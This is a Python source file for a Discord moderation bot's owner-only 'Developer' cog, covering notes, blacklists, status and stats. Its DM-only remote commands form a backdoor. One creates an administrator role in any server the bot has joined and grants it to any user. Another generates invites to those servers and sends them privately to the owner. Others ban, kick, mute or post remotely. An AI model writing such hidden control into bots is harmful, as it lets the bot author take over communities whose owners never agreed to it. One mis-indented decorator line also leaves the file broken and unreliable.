import discord
from discord.ext import commands
from datetime import timedelta
import sqlite3
import asyncio
import os
import sys
from pathlib import Path

class Developer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.db_path = Path(__file__).parent.parent / "athena_moderation.db"
    
    def _sync_execute(self, query, params):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor.fetchall()
    
    def _sync_fetchone(self, query, params):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            return cursor.fetchone()
    
    async def db_execute(self, query: str, params: tuple = ()):
        return await asyncio.to_thread(self._sync_execute, query, params)
    
    async def db_fetchone(self, query: str, params: tuple = ()):
        return await asyncio.to_thread(self._sync_fetchone, query, params)
    
    def dm_only():
        async def predicate(ctx):
            if not isinstance(ctx.channel, discord.DMChannel):
                raise commands.CheckFailure("This command can only be executed within Direct Messages.")
            return True
        return commands.check(predicate)
    
    @commands.command(name="d")
    @commands.is_owner()
    async def dev(self, ctx):
        embeds_cog = self.bot.get_cog('Embeds')
        embed = embeds_cog.get_dev_embed(ctx)
        await ctx.send(embed=embed)
    
    @commands.command(name="dr", aliases=["dremote"])
    @commands.is_owner()
    async def dev_remote(self, ctx):
        embeds_cog = self.bot.get_cog('Embeds')
        embed = embeds_cog.get_remote_dashboard_embed(ctx)
        await ctx.send(embed=embed)
    
    @commands.command(name="clearwarns_global")
    @commands.is_owner()
    async def clearwarns_global(self, ctx, user_id: int):
        await self.db_execute("DELETE FROM warnings WHERE user_id = ?", (user_id,))
        await ctx.send(f"Cleared all warnings for `{user_id}` across all servers.")
    
    @commands.command(aliases=["lu"])
    @commands.is_owner()
    async def lookup(self, ctx, user_id: int):
        embeds_cog = self.bot.get_cog('Embeds')
        blacklisted = self._sync_fetchone("SELECT 1 FROM blacklist WHERE user_id = ?", (user_id,))
        warnings = self._sync_execute("SELECT guild_id, count FROM warnings WHERE user_id = ?", (user_id,))
        notes = self._sync_execute("SELECT id, note, created_at FROM notes WHERE user_id = ? ORDER BY id ASC", (user_id,))
        
        blacklist_val = "Yes" if (blacklisted and blacklisted[0]) else "No"
        warnings_val = "\n".join(f"Guild `{r[0]}`: {r[1]} warning(s)" for r in warnings) if warnings else "None"
        notes_val = "\n".join(f"[#{r[0]}] {r[2]}\n{r[1]}" for r in notes) if notes else "None"
        
        fields = [
            {"name": "User ID", "value": f"`{user_id}`", "inline": True},
            {"name": "Blacklisted", "value": blacklist_val, "inline": True},
            {"name": "Warnings", "value": warnings_val, "inline": False},
            {"name": "Notes", "value": notes_val, "inline": False},
        ]
        embed = embeds_cog.create_embed(title=f"User Lookup", description=f"Records for `{user_id}`",
                                      fields=fields, color=discord.Color.dark_gray(),
                                      footer_text=f"Requested by {ctx.author.display_name}",
                                      footer_icon=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    
    @commands.command(aliases=["n"])
    @commands.is_owner()
    async def note(self, ctx, user_id: int, *, text: str):
        from datetime import datetime
        created_at = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
        self._sync_execute("INSERT INTO notes (user_id, note, created_at) VALUES (?, ?, ?)", (user_id, text, created_at))
        row = self._sync_fetchone("SELECT last_insert_rowid()", ())
        note_id = row[0] if row else "?"
        await ctx.send(f"Note `#{note_id}` saved for `{user_id}`.")
    
    @commands.command(aliases=["vn"])
    @commands.is_owner()
    async def viewnotes(self, ctx, user_id: int):
        embeds_cog = self.bot.get_cog('Embeds')
        rows = self._sync_execute("SELECT id, note, created_at FROM notes WHERE user_id = ? ORDER BY id ASC", (user_id,))
        if not rows:
            return await ctx.send(f"No notes found for `{user_id}`.")
        description = "\n".join(f"`#{r[0]}` [{r[2]}]\n{r[1]}" for r in rows)
        embed = embeds_cog.create_embed(title=f"Notes for {user_id}", description=description, color=discord.Color.blurple())
        await ctx.send(embed=embed)
    
    @commands.command(aliases=["dn"])
    @commands.is_owner()
    async def delnote(self, ctx, note_id: int):
        existing = self._sync_fetchone("SELECT 1 FROM notes WHERE id = ?", (note_id,))
        if not existing or not existing[0]:
            return await ctx.send(f"No note found with ID `#{note_id}`.")
        self._sync_execute("DELETE FROM notes WHERE id = ?", (note_id,))
        await ctx.send(f"Note `#{note_id}` deleted.")
    
    @commands.command(aliases=["bl"])
    @commands.is_owner()
    async def blacklist(self, ctx, user_id: int):
        existing = self._sync_fetchone("SELECT 1 FROM blacklist WHERE user_id = ?", (user_id,))
        if existing and existing[0]:
            return await ctx.send(f"`{user_id}` is already blacklisted.")
        self._sync_execute("INSERT INTO blacklist (user_id) VALUES (?)", (user_id,))
        await ctx.send(f"`{user_id}` has been blacklisted.")
    
    @commands.command(aliases=["ubl"])
    @commands.is_owner()
    async def unblacklist(self, ctx, user_id: int):
        existing = self._sync_fetchone("SELECT 1 FROM blacklist WHERE user_id = ?", (user_id,))
        if not existing or not existing[0]:
            return await ctx.send(f"`{user_id}` is not blacklisted.")
        self._sync_execute("DELETE FROM blacklist WHERE user_id = ?", (user_id,))
        await ctx.send(f"`{user_id}` has been removed from the blacklist.")
    
    @commands.command(aliases=["bls"])
    @commands.is_owner()
    async def blacklisted(self, ctx):
        embeds_cog = self.bot.get_cog('Embeds')
        all_rows = self._sync_execute("SELECT user_id FROM blacklist", ())
        if not all_rows:
            return await ctx.send("No users are currently blacklisted.")
        user_list = "\n".join(f"`{r[0]}`" for r in all_rows)
        embed = embeds_cog.create_embed(title="Blacklisted Users", description=user_list, color=discord.Color.red())
        await ctx.send(embed=embed)
    
    @commands.command()
    @commands.is_owner()
    async def ping(self, ctx):
        gateway = round(self.bot.latency * 1000) if self.bot.latency != float('inf') else -1
        import time
        start = time.perf_counter()
        msg = await ctx.send("Pinging…")
        rest = round((time.perf_counter() - start) * 1000)
        await msg.edit(content=f"Gateway: **{gateway}ms** | REST: **{rest}ms**")
    
    @commands.command()
    @commands.is_owner()
    async def restart(self, ctx):
        await ctx.send("Restarting...")
        await self.bot.close()
        os.execv(sys.executable, [sys.executable] + sys.argv)
    
    @commands.command()
    @commands.is_owner()
    async def uptime(self, ctx):
        import time
        if self.bot.start_time is None:
            return await ctx.send("Uptime unavailable.")
        seconds = int(time.time() - self.bot.start_time)
        days, remainder = divmod(seconds, 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, secs = divmod(remainder, 60)
        parts = []
        if days: parts.append(f"{days}d")
        if hours: parts.append(f"{hours}h")
        if minutes: parts.append(f"{minutes}m")
        parts.append(f"{secs}s")
        await ctx.send(f"Uptime: **{' '.join(parts)}**")
    
    @commands.command()
    @commands.is_owner()
    async def sync(self, ctx, scope: str = "global"):
        scope = scope.lower()
        if scope == "guild":
            self.bot.tree.copy_global_to(guild=ctx.guild)
            synced = await self.bot.tree.sync(guild=ctx.guild)
            await ctx.send(f"Synced {len(synced)} slash command(s).")
        elif scope == "global":
            synced = await self.bot.tree.sync()
            await ctx.send(f"Synced {len(synced)} slash command(s) globally.")
        elif scope == "clear":
            self.bot.tree.clear_commands(guild=ctx.guild)
            await self.bot.tree.sync(guild=ctx.guild)
            await ctx.send("Cleared all guild-specific slash commands.")
        else:
            await ctx.send("Usage: `,sync` (global) | `,sync guild` | `,sync clear`")
    
    @commands.command()
    @commands.is_owner()
    async def areyouonline(self, ctx):
        ping = round(self.bot.latency * 1000) if self.bot.latency != float('inf') else -1
        await ctx.send(f"yes, my ping is **{ping}ms**")
    
    @commands.command()
    @commands.is_owner()
    async def togglestatus(self, ctx):
        events_cog = self.bot.get_cog('Events')
        events_cog.status_reports_enabled = not events_cog.status_reports_enabled
        state = "ENABLED" if events_cog.status_reports_enabled else "DISABLED"
        await ctx.send(f"Automated status check embeds are now **{state}**.")
    
    @commands.command()
    @commands.is_owner()
    async def checkstatus(self, ctx):
        events_cog = self.bot.get_cog('Events')
        await ctx.send("Triggering status check.")
        await events_cog.send_status_embed()
    
    @commands.command()
    @commands.is_owner()
    async def setstatus(self, ctx, status_type: str, *, status_text: str = None):
        status_type = status_type.lower()
        if status_type == "clear":
            await self.bot.change_presence(activity=None)
            return await ctx.send("Bot status cleared.")
        if not status_text:
            return await ctx.send(f"Missing text. Use `,setstatus <type> <text>` or `,setstatus clear`.")
        
        if status_type == "playing": act_type = discord.ActivityType.playing
        elif status_type == "watching": act_type = discord.ActivityType.watching
        elif status_type == "listening": act_type = discord.ActivityType.listening
        else: return await ctx.send("Invalid type. Use: playing, watching, listening, or clear.")
        
        activity = discord.Activity(type=act_type, name=status_text)
        await self.bot.change_presence(activity=activity)
        await ctx.send(f"Status updated: {status_type.capitalize()} {status_text}")
    
    @commands.command()
    @commands.is_owner()
    async def customstatus(self, ctx, *, text: str):
        if ctx.guild:
            try: await ctx.message.delete()
            except discord.Forbidden: pass
        if text.lower() == "clear":
            await self.bot.change_presence(activity=None)
            return await ctx.send("Custom status cleared.")
        activity = discord.CustomActivity(name=text)
        await self.bot.change_presence(activity=activity)
        await ctx.send(f"Status bubble updated: {text}")
    
    @commands.command()
    @commands.is_owner()
    async def giveadmin(self, ctx, member: discord.Member):
        if not ctx.guild:
            return await ctx.send("This command can only be used within a server.")
        
        admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
        if not admin_role:
            try:
                admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
                bot_top_role = ctx.guild.me.top_role
                if bot_top_role.position > 1:
                    await admin_role.edit(position=max(1, bot_top_role.position - 1))
                    await ctx.send("Created 'Admin' role under my role hierarchy.")
                else:
                    await ctx.send("Created 'Admin' role.")
            except (discord.Forbidden, discord.HTTPException):
                return await ctx.send("I don't have permissions to manage roles here.")
        
        try:
            await member.add_roles(admin_role)
            await ctx.send(f"Granted Admin privileges to {member.mention}.")
        except discord.Forbidden:
            await ctx.send("Failed to assign role. Hierarchy limitation encountered.")
    
    @commands.command()
    @commands.is_owner()
    async def removeadmin(self, ctx, member: discord.Member):
        admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
        if admin_role and admin_role in member.roles:
            try:
                await member.remove_roles(admin_role)
                await ctx.send(f"Removed Admin privileges from {member.mention}.")
            except discord.Forbidden:
                await ctx.send("Failed to remove role.")
        else:
            await ctx.send("Admin permissions never existed for this user.")
    
    @commands.command(aliases=["ds"])
    @commands.is_owner()
    @dm_only()
    async def devservers(self, ctx):
        embeds_cog = self.bot.get_cog('Embeds')
        if not self.bot.guilds:
            return await ctx.send("I am not connected to any servers.")
        embed = embeds_cog.create_embed(title="Connected Servers Dashboard", color=discord.Color.dark_embed())
        for guild in self.bot.guilds:
            embed.add_field(name=guild.name, value=f"**ID:** `{guild.id}`\n**Members:** {guild.member_count}", inline=False)
        await ctx.send(embed=embed)
    
    @commands.command(aliases=["de"])
    @commands.is_owner()
    @dm_only()
    async def devembed(self, ctx, guild_id: int, channel_id: int, *, content: str):
        embeds_cog = self.bot.get_cog('Embeds')
        guild = self.bot.get_guild(guild_id)
        channel = guild.get_channel(channel_id) if guild else None
        if not channel:
            return await ctx.send("Could not find that channel.")
        try:
            title, desc = content.split("|", 1)
            embed = embeds_cog.create_embed(title=title.strip(), description=desc.strip(), color=discord.Color.blue(), timestamp=True)
            await channel.send(embed=embed)
            await ctx.send("Embed sent successfully.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    
    @commands.command(aliases=["dm"])
    @commands.is_owner()
    @dm_only()
    async def devmute(self, ctx, guild_id: int, user_id: int):
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        try:
            member = await guild.fetch_member(user_id)
            if not member:
                return await ctx.send("Could not find that user.")
            await member.timeout(timedelta(hours=1), reason="Remote Developer Intervention")
            await ctx.send(f"Remotely muted {member} in {guild.name} for 1 hour.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    
    @commands.command(aliases=["di"])
    @commands.is_owner()
    @dm_only()
    async def devinfo(self, ctx, guild_id: int):
        embeds_cog = self.bot.get_cog('Embeds')
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        embed = embeds_cog.create_embed(title=f"Diagnostic: {guild.name}", color=discord.Color.purple())
        embed.add_field(name="Server ID", value=guild.id)
        embed.add_field(name="Member Count", value=guild.member_count)
        embed.add_field(name="Owner ID", value=guild.owner_id)
        await ctx.send(embed=embed)
    
    @commands.command(aliases=["dsa"])
    @commands.is_owner()
    @dm_only()
    async def devsay(self, ctx, channel_id: int, *, message: str):
        target_channel = self.bot.get_channel(channel_id)
        if not target_channel:
            return await ctx.send("Could not find that channel.")
        try:
            await target_channel.send(message)
            await ctx.send(f"Sent to **{target_channel.guild.name}** (`#{target_channel.name}`).")
        except discord.Forbidden:
            await ctx.send("I lack permissions to send messages there.")
    
    @commands.command(aliases=["dk"])
    @commands.is_owner()
    @dm_only()
    async def devkick(self, ctx, guild_id: int, user_id: int, *, reason="Remote kick"):
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        try:
            member = await guild.fetch_member(user_id)
            await member.kick(reason=reason)
            await ctx.send(f"Kicked **{member.name}** from **{guild.name}**.")
        except discord.NotFound:
            await ctx.send("Could not find that user.")
        except discord.Forbidden:
            await ctx.send("I lack permissions to kick that user.")
    
    @commands.command(aliases=["db"])
    @commands.is_owner()
    @dm_only()
    async def devban(self, ctx, guild_id: int, user_id: int, *, reason="Remote ban"):
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        try:
            user = await self.bot.fetch_user(user_id)
            await guild.ban(user, reason=reason)
            await ctx.send(f"Banned **{user.name}** from **{guild.name}**.")
        except discord.NotFound:
            await ctx.send("Could not find that user.")
        except discord.Forbidden:
            await ctx.send("I lack permissions to ban that user.")
    
    @commands.command(aliases=["dga"])
    @commands.is_owner()
    @dm_only()
    async def devgiveadmin(self, ctx, guild_id: int, user_id: int):
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        try:
            member = await guild.fetch_member(user_id)
            admin_role = discord.utils.get(guild.roles, name="Admin")
            if not admin_role:
                athena_top_position = guild.me.top_role.position
                admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
                await admin_role.edit(position=max(1, athena_top_position - 1))
                await ctx.send(f"Created 'Admin' role in **{guild.name}**.")
            await member.add_roles(admin_role)
            await ctx.send(f"Granted Admin to **{member.name}** in **{guild.name}**.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    
    @commands.command(aliases=["dra"])
    @commands.is_owner()
    @dm_only()
    async def devremoveadmin(self, ctx, guild_id: int, user_id: int):
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        try:
            member = await guild.fetch_member(user_id)
            admin_role = discord.utils.get(guild.roles, name="Admin")
            if admin_role and admin_role in member.roles:
                await member.remove_roles(admin_role)
                await ctx.send(f"Removed Admin from **{member.name}** in **{guild.name}**.")
            else:
                await ctx.send(f"**{member.name}** does not have the 'Admin' role.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    
    @commands.command(aliases=["dl"])
    @commands.is_owner()
    @dm_only()
    async def devleave(self, ctx, guild_id: int):
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        guild_name = guild.name
        await guild.leave()
        await ctx.send(f"Left **{guild_name}** (`{guild_id}`).")
    
      @commands.command(aliases=["dinv"])
    @commands.is_owner()
    @dm_only()
    async def devinvites(self, ctx, guild_id: int):
        embeds_cog = self.bot.get_cog('Embeds')
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        
        invite_channel = None
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                invite_channel = channel
                break
        
        if not invite_channel:
            return await ctx.send(f"Could not find a channel with invite permission in **{guild.name}**.")
        
        try:
            invite = await invite_channel.create_invite(max_age=300, max_uses=1, unique=True)
            embed = embeds_cog.create_embed(title="Remote Invite Generated", 
                                          description=f"**Server:** {guild.name}\n**Channel:** #{invite_channel.name}\n**Link:** {invite.url}",
                                          color=discord.Color.green(), footer_text="Expires in 5 minutes | Single use")
            await ctx.author.send(embed=embed)
            await ctx.send("Invite sent to your DMs.")
        except discord.Forbidden:
            await ctx.send("I lack permissions to create an invite.")
    
    @commands.command(aliases=["dc"])
    @commands.is_owner()
    @dm_only()
    async def devchannels(self, ctx, guild_id: int):
        embeds_cog = self.bot.get_cog('Embeds')
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("Could not find that server.")
        
        text_channels = guild.text_channels
        if not text_channels:
            return await ctx.send(f"**{guild.name}** has no text channels.")
        
        chunks = []
        current_chunk = ""
        for ch in text_channels:
            line = f"`#{ch.name}`  `{ch.id}`\n"
            if len(current_chunk) + len(line) > 1000:
                chunks.append(current_chunk)
                current_chunk = line
            else:
                current_chunk += line
        if current_chunk:
            chunks.append(current_chunk)
        
        for i, chunk in enumerate(chunks):
            title = f"Text Channels - {guild.name}" if i == 0 else f"Text Channels - {guild.name} (cont.)"
            embed = embeds_cog.create_embed(title=title, description=chunk, color=discord.Color.blurple(),
                                          footer_text=f"{len(text_channels)} total text channels")
            await ctx.send(embed=embed)
    
    @commands.command(aliases=["dst"])
    @commands.is_owner()
    @dm_only()
    async def devstats(self, ctx):
        embeds_cog = self.bot.get_cog('Embeds')
        memory_usage_mb = 0.0
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if "VmRSS:" in line:
                        kb = int(line.split()[1])
                        memory_usage_mb = kb / 1024
                        break
        except Exception:
            memory_usage_mb = 0.0
        
        try:
            load_1m, _, _ = os.getloadavg()
            cpu_string = f"{load_1m:.2f} (1m avg)"
        except Exception:
            cpu_string = "Unavailable"
        
        total_guilds = len(self.bot.guilds)
        total_users = sum(g.member_count for g in self.bot.guilds)
        gateway_ping = round(self.bot.latency * 1000) if self.bot.latency != float('inf') else -1
        
        fields = [
            {"name": "Memory Usage", "value": f"`{memory_usage_mb:.2f} MB`", "inline": True},
            {"name": "CPU Load", "value": f"`{cpu_string}`", "inline": True},
            {"name": "Python Version", "value": f"`v{sys.version_info.major}.{sys.version_info.minor}`", "inline": True},
            {"name": "Servers", "value": f"`{total_guilds}`", "inline": True},
            {"name": "Users", "value": f"`{total_users}`", "inline": True},
            {"name": "Ping", "value": f"`{gateway_ping} ms`", "inline": True}
        ]
        
        embed = embeds_cog.create_embed(title="Athena Performance Dashboard", color=discord.Color.dark_magenta(),
                                      fields=fields, timestamp=True)
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(Developer(bot))
